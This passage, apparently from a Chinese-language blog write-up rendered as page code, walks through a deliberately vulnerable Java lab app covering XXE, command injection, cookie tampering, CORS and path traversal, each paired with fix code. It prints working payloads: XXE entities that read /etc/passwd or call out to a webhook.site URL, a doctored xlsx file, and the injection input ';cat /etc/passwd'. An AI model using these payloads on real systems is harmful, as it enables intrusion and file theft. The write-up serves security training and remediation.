解析器，用于构建树状结构`),i(`td`,{style:{"text-align":`left`}},`需要完整树结构操作，如修改和多次遍历 XML 文件`),i(`td`,{style:{"text-align":`left`}},`完整保留文档结构，易于查找和修改`),i(`td`,{style:{"text-align":`left`}},`内存占用较大，处理大文件时性能较差`)]),i(`tr`,null,[i(`td`,{style:{"text-align":`left`}},[i(`code`,null,`DocumentHelper`)]),i(`td`,{style:{"text-align":`left`}},`Dom4j 提供的辅助类，用于快速创建和操作 XML 文档`),i(`td`,{style:{"text-align":`left`}},`需要手动构建和操作 XML 文档时`),i(`td`,{style:{"text-align":`left`}},`快速创建和处理 XML 文档，灵活性高`),i(`td`,{style:{"text-align":`left`}},`内存占用较大，处理超大文件时性能不佳`)])])],-1),s[309]||=i(`h4`,{id:`统一漏洞利用payload`,tabindex:`-1`},[r(`统一漏洞利用payload `),i(`a`,{class:`header-anchor`,href:`#统一漏洞利用payload`,"aria-label":`Permalink to "统一漏洞利用payload"`},`​`)],-1),s[310]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7">]><root>&xxe;</root>

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[311]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281127895.png`,alt:`image-20250728112724781`,loading:`lazy`,decoding:`async`})],-1),s[312]||=i(`h4`,{id:`统一修复代码`,tabindex:`-1`},[r(`统一修复代码 `),i(`a`,{class:`header-anchor`,href:`#统一修复代码`,"aria-label":`Permalink to "统一修复代码"`},`​`)],-1),s[313]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`//实例化解析类之后通常会支持着三个配置
obj.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
obj.setFeature("http://xml.org/sax/features/external-general-entities", false);
obj.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[314]||=i(`p`,null,`禁用了外部实体，限制实体来源。`,-1),s[315]||=i(`h4`,{id:`_10-xxe-xmlbeam-vuln`,tabindex:`-1`},[r(`10./xxe/xmlbeam/vuln `),i(`a`,{class:`header-anchor`,href:`#_10-xxe-xmlbeam-vuln`,"aria-label":`Permalink to "10./xxe/xmlbeam/vuln"`},`​`)],-1),s[316]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`        @PostMapping(value = "/xmlbeam/vuln")
        HttpEntity<String> post(@RequestBody UserPayload user) {
            try {
                logger.info(user.toString());
                return ResponseEntity.ok(String.format("hello, %s!", user.getUserName()));
            }catch (Exception e){
                e.printStackTrace();
                return ResponseEntity.ok("error");
            }
        }

        /**
         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.
         */
        @ProjectedPayload
        public interface UserPayload {
            @XBRead("//userName")
            String getUserName();
        }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[317]||=i(`p`,null,`该代码需要使用固定的标签可以实现回显，我们可以构造payload：`,-1),s[318]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>
<userPayload>
    <userName>&xxe;</userName>
</userPayload>

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[319]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281443153.png`,alt:`image-20250728144316073`,loading:`lazy`,decoding:`async`})],-1),s[320]||=i(`h4`,{id:`_11-ooxml-readxlsx`,tabindex:`-1`},[r(`11/ooxml/readxlsx `),i(`a`,{class:`header-anchor`,href:`#_11-ooxml-readxlsx`,"aria-label":`Permalink to "11/ooxml/readxlsx"`},`​`)],-1),s[321]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` @PostMapping("/readxlsx")
    @ResponseBody
    public String ooxml_xxe(MultipartFile file) throws IOException {
        XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln

        XSSFSheet sheet = wb.getSheetAt(0);
        XSSFRow row;
        XSSFCell cell;

        Iterator rows = sheet.rowIterator();
        StringBuilder sbResult = new StringBuilder();

        while (rows.hasNext()) {

            row = (XSSFRow) rows.next();
            Iterator cells = row.cellIterator();

            while (cells.hasNext()) {
                cell = (XSSFCell) cells.next();

                if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) {
                    sbResult.append(cell.getStringCellValue()).append(" ");
                } else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) {
                    sbResult.append(cell.getNumericCellValue()).append(" ");
                } else {
                    logger.info("errors");
                }
            }
        }

        return sbResult.toString();
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[322]||=i(`p`,null,`查看源码得知使用的是poi-ooxml组件（ Apache POI是提供Microsoft Office系列文档读、写功能的 JAVA 类库）进行xlsx文件操作，在3.10版本及以下存在XXE注入漏洞，3.15以下版本存在Dos漏洞，这里使用的是3.9版本。`,-1),s[323]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281145386.png`,alt:`image-20250728114555336`,loading:`lazy`,decoding:`async`})],-1),s[324]||=i(`p`,null,`我们新建一个1.xlsx，用7-zip打开这个文件的压缩包`,-1),s[325]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281417899.png`,alt:`image-20250728141719633`,loading:`lazy`,decoding:`async`})],-1),s[326]||=i(`p`,null,`然后修改[Content_Types].xml文件，在最上面添加`,-1),s[327]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`<!DOCTYPE test [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7">
]>
<test>&xxe;</test>
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[328]||=i(`p`,null,`在upload路由下上传这个1.xlsx，我们在webhook能发现这个文件执行成功了`,-1),s[329]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281418084.png`,alt:`image-20250728141829969`,loading:`lazy`,decoding:`async`})],-1),s[330]||=i(`h4`,{id:`_12-xlsx-streamer-readxlsx`,tabindex:`-1`},[r(`12./xlsx-streamer/readxlsx `),i(`a`,{class:`header-anchor`,href:`#_12-xlsx-streamer-readxlsx`,"aria-label":`Permalink to "12./xlsx-streamer/readxlsx"`},`​`)],-1),s[331]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` @PostMapping("/readxlsx")
    public void xllx_streamer_xxe(MultipartFile file) throws IOException {
        StreamingReader.builder().open(file.getInputStream());
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[332]||=i(`p`,null,`和上题相比就是换了个库的区别，payload一样的`,-1),s[333]||=i(`h3`,{id:`commandinject`,tabindex:`-1`},[r(`Commandinject `),i(`a`,{class:`header-anchor`,href:`#commandinject`,"aria-label":`Permalink to "Commandinject"`},`​`)],-1),s[334]||=i(`h4`,{id:`_1-codeinject`,tabindex:`-1`},[r(`1./codeinject `),i(`a`,{class:`header-anchor`,href:`#_1-codeinject`,"aria-label":`Permalink to "1./codeinject"`},`​`)],-1),s[335]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/codeinject")
    public String codeInject(String filepath) throws IOException {

        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[336]||=i(`p`,null,`将传入的参数直接与原命令拼接，实现命令注入`,-1),s[337]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?filepath=;cat /etc/passwd
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[338]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281439849.png`,alt:`image-20250728143906716`,loading:`lazy`,decoding:`async`})],-1),s[339]||=i(`h4`,{id:`_2-codeinject-host`,tabindex:`-1`},[r(`2./codeinject/host `),i(`a`,{class:`header-anchor`,href:`#_2-codeinject-host`,"aria-label":`Permalink to "2./codeinject/host"`},`​`)],-1),s[340]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@GetMapping("/codeinject/host")
    public String codeInjectHost(HttpServletRequest request) throws IOException {

        String host = request.getHeader("host");
        logger.info(host);
        String[] cmdList = new String[]{"sh", "-c", "curl " + host};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[341]||=i(`p`,null,`同样可以使用命令拼接，但需要再host字段处进行传参（不知道为啥我传不上去，用大佬的图片代替一下）`,-1),s[342]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281459171.png`,alt:`image-20250728145951030`,loading:`lazy`,decoding:`async`})],-1),s[343]||=i(`h4`,{id:`漏洞修复`,tabindex:`-1`},[r(`漏洞修复 `),i(`a`,{class:`header-anchor`,href:`#漏洞修复`,"aria-label":`Permalink to "漏洞修复"`},`​`)],-1),s[344]||=i(`p`,null,`修复代码`,-1),s[345]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @GetMapping("/codeinject/sec")
    public String codeInjectSec(String filepath) throws IOException {
        String filterFilePath = SecurityUtil.cmdFilter(filepath);
        if (null == filterFilePath) {
            return "Bad boy. I got u.";
        }
        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filterFilePath};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[346]||=i(`p`,null,`cmdFilter函数代码：`,-1),s[347]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\\\.-]+$");
   public static String cmdFilter(String input) {
        if (!FILTER_PATTERN.matcher(input).matches()) {
            return null;
        }

        return input;
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[348]||=i(`p`,null,`限制了参数中的字符，防止命令注入。`,-1),s[349]||=i(`h3`,{id:`cookie伪造`,tabindex:`-1`},[r(`Cookie伪造 `),i(`a`,{class:`header-anchor`,href:`#cookie伪造`,"aria-label":`Permalink to "Cookie伪造"`},`​`)],-1),s[350]||=i(`h4`,{id:`_1-cookie-vuln01`,tabindex:`-1`},[r(`1./cookie/vuln01 `),i(`a`,{class:`header-anchor`,href:`#_1-cookie-vuln01`,"aria-label":`Permalink to "1./cookie/vuln01"`},`​`)],-1),s[351]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    private static String NICK = "nick";

    @GetMapping(value = "/vuln01")
    public String vuln01(HttpServletRequest req) {
        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
        return "Cookie nick: " + nick;
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[352]||=i(`h4`,{id:`_2-cookie-vuln02`,tabindex:`-1`},[r(`2./cookie/vuln02 `),i(`a`,{class:`header-anchor`,href:`#_2-cookie-vuln02`,"aria-label":`Permalink to "2./cookie/vuln02"`},`​`)],-1),s[353]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` @GetMapping(value = "/vuln02")
    public String vuln02(HttpServletRequest req) {
        String nick = null;
        Cookie[] cookie = req.getCookies();

        if (cookie != null) {
            nick = getCookie(req, NICK).getValue();  // key code
        }

        return "Cookie nick: " + nick;
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[354]||=i(`h4`,{id:`_3-cookie-vuln03`,tabindex:`-1`},[r(`3./cookie/vuln03 `),i(`a`,{class:`header-anchor`,href:`#_3-cookie-vuln03`,"aria-label":`Permalink to "3./cookie/vuln03"`},`​`)],-1),s[355]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`   @GetMapping(value = "/vuln03")
    public String vuln03(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                // key code. Equals can also be equalsIgnoreCase.
                if (NICK.equals(cookie.getName())) {
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }
Java复制代码1234567891011121314
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[356]||=i(`h4`,{id:`_4-cookie-vuln04`,tabindex:`-1`},[r(`4./cookie/vuln04 `),i(`a`,{class:`header-anchor`,href:`#_4-cookie-vuln04`,"aria-label":`Permalink to "4./cookie/vuln04"`},`​`)],-1),s[357]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@GetMapping(value = "/vuln04")
    public String vuln04(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if (cookie.getName().equalsIgnoreCase(NICK)) {  // key code
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[358]||=i(`h4`,{id:`_5-cookie-vuln05`,tabindex:`-1`},[r(`5./cookie/vuln05 `),i(`a`,{class:`header-anchor`,href:`#_5-cookie-vuln05`,"aria-label":`Permalink to "5./cookie/vuln05"`},`​`)],-1),s[359]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`   @GetMapping(value = "/vuln05")
    public String vuln05(@CookieValue("nick") String nick) {
        return "Cookie nick: " + nick;
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[360]||=i(`h4`,{id:`_6-cookie-vuln06`,tabindex:`-1`},[r(`6./cookie/vuln06 `),i(`a`,{class:`header-anchor`,href:`#_6-cookie-vuln06`,"aria-label":`Permalink to "6./cookie/vuln06"`},`​`)],-1),s[361]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@GetMapping(value = "/vuln06")
    public String vuln06(@CookieValue(value = "nick") String nick) {
        return "Cookie nick: " + nick;
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[362]||=i(`h4`,{id:`漏洞利用`,tabindex:`-1`},[r(`漏洞利用. `),i(`a`,{class:`header-anchor`,href:`#漏洞利用`,"aria-label":`Permalink to "漏洞利用."`},`​`)],-1),s[363]||=i(`p`,null,`我们可以直接通过修改cookie的值实现对nick值的修改，某些情况可能会存在越权漏洞，操作如下：`,-1),s[364]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291046226.png`,alt:`image-20250729104624089`,loading:`lazy`,decoding:`async`})],-1),s[365]||=i(`h3`,{id:`cors`,tabindex:`-1`},[r(`CORS `),i(`a`,{class:`header-anchor`,href:`#cors`,"aria-label":`Permalink to "CORS"`},`​`)],-1),s[366]||=i(`h4`,{id:`原理`,tabindex:`-1`},[r(`原理 `),i(`a`,{class:`header-anchor`,href:`#原理`,"aria-label":`Permalink to "原理"`},`​`)],-1),s[367]||=i(`p`,null,[i(`strong`,null,`跨源资源共享`),r(`（CORS，全称为 Cross-Origin Resource Sharing）是一种基于 HTTP 头的机制，允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。CORS 机制通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。`)],-1),s[368]||=i(`p`,null,`比如说：有两个域a1.com和b1.com，假设b1.com上面有个接口能够获取一些返回的数据，那么如果我们从a1.com写一段js去请求这个接口的数据，一般来说是请求不了的，会在浏览器爆出CORS错误，但如果有CORS设置，就可以实现这样的访问，甚至可以能够使用b1.com上的cookie。`,-1),s[369]||=i(`h4`,{id:`_1-cors-vuln-origin`,tabindex:`-1`},[r(`1./cors/vuln/origin `),i(`a`,{class:`header-anchor`,href:`#_1-cors-vuln-origin`,"aria-label":`Permalink to "1./cors/vuln/origin"`},`​`)],-1),s[370]||=i(`pre`,null,[i(`code`,null,`private static String info = "{\\"name\\": \\"JoyChou\\", \\"phone\\": \\"18200001111\\"}";

@GetMapping("/vuln/origin")
public String vuls1(HttpServletRequest request, HttpServletResponse response) {
    String origin = request.getHeader("origin");
    response.setHeader("Access-Control-Allow-Origin", origin); // set origin from header
    response.setHeader("Access-Control-Allow-Credentials", "true");  // allow cookie
    return info;
}
`)],-1),s[371]||=i(`h4`,{id:`_2-cors-vuln-setheader`,tabindex:`-1`},[r(`2./cors/vuln/setHeader `),i(`a`,{class:`header-anchor`,href:`#_2-cors-vuln-setheader`,"aria-label":`Permalink to "2./cors/vuln/setHeader"`},`​`)],-1),s[372]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@GetMapping("/vuln/setHeader")
    public String vuls2(HttpServletResponse response) {
        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常
        response.setHeader("Access-Control-Allow-Origin", "*");
        return info;
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[373]||=i(`h4`,{id:`_3-cors-vuln-crossorigin`,tabindex:`-1`},[r(`3./cors/vuln/crossOrigin `),i(`a`,{class:`header-anchor`,href:`#_3-cors-vuln-crossorigin`,"aria-label":`Permalink to "3./cors/vuln/crossOrigin"`},`​`)],-1),s[374]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @GetMapping("*")
    @RequestMapping("/vuln/crossOrigin")
    public String vuls3() {
        return info;
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[375]||=i(`h4`,{id:`漏洞验证`,tabindex:`-1`},[r(`漏洞验证 `),i(`a`,{class:`header-anchor`,href:`#漏洞验证`,"aria-label":`Permalink to "漏洞验证"`},`​`)],-1),s[376]||=i(`p`,null,`我们可以通过修改origin字段来验证漏洞`,-1),s[377]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291407579.png`,alt:`image-20250729140718474`,loading:`lazy`,decoding:`async`})],-1),s[378]||=i(`h4`,{id:`漏洞防御`,tabindex:`-1`},[r(`漏洞防御 `),i(`a`,{class:`header-anchor`,href:`#漏洞防御`,"aria-label":`Permalink to "漏洞防御"`},`​`)],-1),s[379]||=i(`h5`,{id:`_1-限制origin`,tabindex:`-1`},[r(`（1）限制origin `),i(`a`,{class:`header-anchor`,href:`#_1-限制origin`,"aria-label":`Permalink to "（1）限制origin"`},`​`)],-1),s[380]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`  @CrossOrigin(origins = {"joychou.org", "http://test.joychou.me"})
    @GetMapping("/sec/crossOrigin")
    public String secCrossOrigin() {
        return info;
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[381]||=i(`h5`,{id:`_2-webmvcconfigurer设置cors`,tabindex:`-1`},[r(`（2）WebMvcConfigurer设置Cors `),i(`a`,{class:`header-anchor`,href:`#_2-webmvcconfigurer设置cors`,"aria-label":`Permalink to "（2）WebMvcConfigurer设置Cors"`},`​`)],-1),s[382]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`  @GetMapping("/sec/webMvcConfigurer")
    public CsrfToken getCsrfToken_01(CsrfToken token) {
        return token;
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[383]||=i(`p`,null,`对应的过滤器`,-1),s[384]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurerAdapter() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                // 为了支持一级域名，重写了checkOrigin
                //String[] allowOrigins = {"joychou.org", "http://test.joychou.me"};
                registry.addMapping("/cors/sec/webMvcConfigurer") // /**表示所有路由path
                        //.allowedOrigins(allowOrigins)
                        .allowedMethods("GET", "POST")
                        .allowCredentials(true);
            }
        };
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[385]||=i(`h5`,{id:`_3-spring-security设置cors`,tabindex:`-1`},[r(`（3）spring security设置cors `),i(`a`,{class:`header-anchor`,href:`#_3-spring-security设置cors`,"aria-label":`Permalink to "（3）spring security设置cors"`},`​`)],-1),s[386]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@GetMapping("/sec/httpCors")
public CsrfToken getCsrfToken_02(CsrfToken token) {
    return token;
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[387]||=i(`p`,null,`对应过滤器：`,-1),s[388]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    CorsConfigurationSource corsConfigurationSource()
    {
        // Set cors origin white list
        ArrayList<String> allowOrigins = new ArrayList<>();
        allowOrigins.add("joychou.org");
        allowOrigins.add("https://test.joychou.me"); // 区分http和https，并且默认不会拦截同域请求。

        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(allowOrigins);
        configuration.setAllowCredentials(true);
        configuration.setAllowedMethods(Arrays.asList("GET", "POST"));
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/cors/sec/httpCors", configuration); // ant style
        return source;
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[389]||=i(`h5`,{id:`_4-自定义filter设置cors`,tabindex:`-1`},[r(`（4）自定义filter设置cors `),i(`a`,{class:`header-anchor`,href:`#_4-自定义filter设置cors`,"aria-label":`Permalink to "（4）自定义filter设置cors"`},`​`)],-1),s[390]||=i(`p`,null,`防御代码：`,-1),s[391]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @GetMapping("/sec/originFilter")
    public CsrfToken getCsrfToken_03(CsrfToken token) {
        return token;
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[392]||=i(`p`,null,`对应过滤器：`,-1),s[393]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@WebFilter(filterName = "OriginFilter", urlPatterns = "/cors/sec/originFilter")
public class OriginFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)
            throws IOException, ServletException {

        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        String origin = request.getHeader("Origin");
        logger.info("[+] Origin: " + origin + "\\tCurrent url:" + request.getRequestURL());

        // 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑
        if (origin != null && SecurityUtil.checkURL(origin) == null) {
            logger.error("[-] Origin check error. " + "Origin: " + origin +
                    "\\tCurrent url:" + request.getRequestURL());
            response.setStatus(response.SC_FORBIDDEN);
            response.getWriter().println("Invaid cors config by joychou.");
            return;
        }

        response.setHeader("Access-Control-Allow-Origin", origin);
        response.setHeader("Access-Control-Allow-Credentials", "true");
        response.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTION");

        filterChain.doFilter(req, res);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[394]||=i(`h5`,{id:`_5-corsfilter设置cors`,tabindex:`-1`},[r(`（5）CorsFilter设置cors `),i(`a`,{class:`header-anchor`,href:`#_5-corsfilter设置cors`,"aria-label":`Permalink to "（5）CorsFilter设置cors"`},`​`)],-1),s[395]||=i(`p`,null,`防御代码：`,-1),s[396]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` @RequestMapping("/sec/corsFilter")
    public CsrfToken getCsrfToken_04(CsrfToken token) {
        return token;
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[397]||=i(`p`,null,`对应过滤器：`,-1),s[398]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`public class BaseCorsFilter extends CorsFilter {

    public BaseCorsFilter() {
        super(configurationSource());
    }

    private static UrlBasedCorsConfigurationSource configurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowCredentials(true);
        config.addAllowedOrigin("joychou.org"); // 不支持
        config.addAllowedOrigin("http://test.joychou.me");
        config.addAllowedHeader("*");
        config.addAllowedMethod("GET");
        config.addAllowedMethod("POST");

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/cors/sec/corsFilter", config);

        return source;
    }
}
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[399]||=i(`h5`,{id:`_6-origin检查`,tabindex:`-1`},[r(`（6）origin检查 `),i(`a`,{class:`header-anchor`,href:`#_6-origin检查`,"aria-label":`Permalink to "（6）origin检查"`},`​`)],-1),s[400]||=i(`p`,null,`防御代码：`,-1),s[401]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @GetMapping("/sec/checkOrigin")
    public String seccode(HttpServletRequest request, HttpServletResponse response) {
        String origin = request.getHeader("Origin");

        // 如果origin不为空并且origin不在白名单内，认定为不安全。
        // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。
        if (origin != null && SecurityUtil.checkURL(origin) == null) {
            return "Origin is not safe.";
        }
        response.setHeader("Access-Control-Allow-Origin", origin);
        response.setHeader("Access-Control-Allow-Credentials", "true");
        return LoginUtils.getUserInfo2JsonStr(request);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[402]||=i(`h3`,{id:`目录遍历`,tabindex:`-1`},[r(`目录遍历 `),i(`a`,{class:`header-anchor`,href:`#目录遍历`,"aria-label":`Permalink to "目录遍历"`},`​`)],-1),s[403]||=i(`h4`,{id:`_1-path-traversal-vul`,tabindex:`-1`},[r(`1./path_traversal/vul `),i(`a`,{class:`header-anchor`,href:`#_1-path-traversal-vul`,"aria-label":`Permalink to "1./path_traversal/vul"`},`​`)],-1),s[404]||=i(`p`,null,`漏洞代码：`,-1),s[405]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`  @GetMapping("/path_traversal/vul")
    public String getImage(String filepath) throws IOException {
        return getImgBase64(filepath);
    }
private String getImgBase64(String imgFile) throws IOException {

        logger.info("Working directory: " + System.getProperty("user.dir"));
        logger.info("File path: " + imgFile);

        File f = new File(imgFile);
        if (f.exists() && !f.isDirectory()) {
            byte[] data = Files.readAllBytes(Paths.get(imgFile));
            return new String(Base64.encodeBase64(data));
        } else {
            return "File doesn't exist or is not a file.";
        }
    }
